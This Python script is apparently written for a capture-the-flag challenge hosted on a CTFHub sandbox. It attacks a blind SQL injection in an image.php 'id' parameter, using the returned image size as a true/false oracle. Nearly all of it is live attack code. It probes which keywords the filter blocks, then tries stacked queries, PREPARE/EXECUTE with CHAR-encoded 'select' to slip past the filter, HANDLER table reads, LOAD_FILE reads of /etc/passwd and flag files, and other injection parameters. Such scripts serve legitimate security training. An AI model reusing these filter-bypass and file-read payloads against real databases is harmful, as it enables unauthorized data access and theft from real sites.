#!/usr/bin/env python3
"""WebsiteManger - try bypassing SELECT WAF block via stacked queries, PREPARE/EXECUTE, HANDLER."""
import requests
import urllib.parse

TARGET = "http://challenge-ab97d555c14efe7b.sandbox.ctfhub.com:10800"
IMAGE_SIZE = 6106

def test_raw(payload):
    """Send raw payload and return response."""
    url = f"{TARGET}/image.php?id={urllib.parse.quote(payload)}"
    try:
        r = requests.get(url, timeout=10)
        return len(r.content), r.text[:200]
    except Exception as e:
        return -1, str(e)

def test_cond(condition):
    """Boolean test via the image size oracle."""
    size, _ = test_raw(f"1&&({condition})")
    return size == IMAGE_SIZE

# 1. Test if keywords other than SELECT are blocked
print("=== Keyword blocking test ===")
for kw in ["select", "SELECT", "prepare", "PREPARE", "execute", "EXECUTE",
           "handler", "HANDLER", "load_file", "LOAD_FILE", "from", "FROM",
           "hex", "HEX", "unhex", "UNHEX", "char", "CHAR",
           "union", "UNION", "sleep", "SLEEP", "benchmark", "BENCHMARK"]:
    size, text = test_raw(f"1&&({kw})")
    if "WHAT ARE YOU DOING" in text:
        print(f"  BLOCKED: {kw}")
    elif size > 100:
        print(f"  OK ({size}B): {kw}")
    else:
        print(f"  {size}B: {kw}")

# 2. Test stacked queries
print("\n=== Stacked query test ===")
# Test if we can use ; to stack queries
payloads = [
    "1;select 1--",
    "1;set @a=1--",
    "1;PREPARE x FROM 'SELECT 1';EXECUTE x--",
    "1;handler images open;handler images read first--",
    "1;LOAD_FILE('/etc/passwd')--",
]
for p in payloads:
    size, text = test_raw(p)
    if "WHAT ARE YOU DOING" in text:
        print(f"  BLOCKED: {p[:60]}")
    else:
        print(f"  {size}B: {p[:60]}  -> {text[:80]}")

# 3. Test PREPARE with CHAR() to avoid SELECT keyword
print("\n=== PREPARE/EXECUTE with CHAR() ===")
# "select" = CHAR(115,101,108,101,99,116)
# "SELECT" = CHAR(83,69,76,69,67,84)
# "select 1" = CHAR(115,101,108,101,99,116,32,49)
select_char = "char(115,101,108,101,99,116)"
prepare_tests = [
    f"1;set @s=concat({select_char},char(32),char(49));prepare x from @s;execute x--",
    f"1;set @s={select_char};prepare x from @s;execute x--",
    f"1;prepare x from {select_char};execute x--",  # bare prepare
]
for p in prepare_tests:
    size, text = test_raw(p)
    if "WHAT ARE YOU DOING" in text:
        print(f"  BLOCKED: {p[:80]}")
    else:
        print(f"  {size}B: {p[:80]}  -> {text[:100]}")

# 4. Test HANDLER as alternative to SELECT
print("\n=== HANDLER tests ===")
handler_tests = [
    "1;handler images open;handler images read first;--",
    "1;handler images open as h;handler h read first;--",
    "1;handler `images` open;handler `images` read first;--",
]
for p in handler_tests:
    size, text = test_raw(p)
    if "WHAT ARE YOU DOING" in text:
        print(f"  BLOCKED: {p[:60]}")
    else:
        print(f"  {size}B: {p[:60]}  -> {text[:100]}")

# 5. Test LOAD_FILE for direct file read
print("\n=== LOAD_FILE tests ===")
for path in ["/etc/passwd", "/flag", "/flag.txt", "/var/www/html/flag.php",
             "C:/flag.txt", "/flag.php"]:
    size, text = test_raw(f"1&&(length(load_file('{path}'))>0)")
    if "WHAT ARE YOU DOING" in text:
        print(f"  BLOCKED: load_file")
        break
    elif size == IMAGE_SIZE:
        print(f"  FILE EXISTS: {path}")
    else:
        print(f"  not found or error: {path}")

# 6. Try subquery in existing context without SELECT keyword
print("\n=== Subquery tricks (no SELECT) ===")
# In MariaDB, VALUES, TABLE keyword might work?
# Or use the fact we might already be in a SELECT context
tests = [
    "1&&exists(table images)",       # TABLE keyword (MariaDB 10.3+)
    "1&&exists(table `images`)",
    "1&&(table images) is not null",
]
for t in tests:
    size, text = test_raw(t)
    if "WHAT ARE YOU DOING" in text:
        print(f"  BLOCKED: {t}")
    elif size == IMAGE_SIZE:
        print(f"  TRUE: {t}")
    else:
        print(f"  FALSE/ERROR ({size}B): {t}")

# 7. Test if we can use semicolons at all (stacked queries allowed?)
print("\n=== Semicolon / stacked query support ===")
for p in ["1;set @x=1--", "1; set @x=1;--", "1%3Bset%20@x%3D1%3B--"]:
    size, text = test_raw(p)
    print(f"  {size}B: {p[:50]}  -> {text[:80]}")

# 8. Check image.php parameter context - maybe id= isn't the only param
print("\n=== Other injection points on image.php ===")
for param, value in [("id", "1"), ("file", "1"), ("path", "1"), ("src", "test.png"),
                     ("name", "1"), ("type", "png"), ("width", "100")]:
    url = f"{TARGET}/image.php?{param}={value}"
    r = requests.get(url, timeout=5)
    print(f"  {param}={value}: {len(r.text)}B")

print("\nDone!")
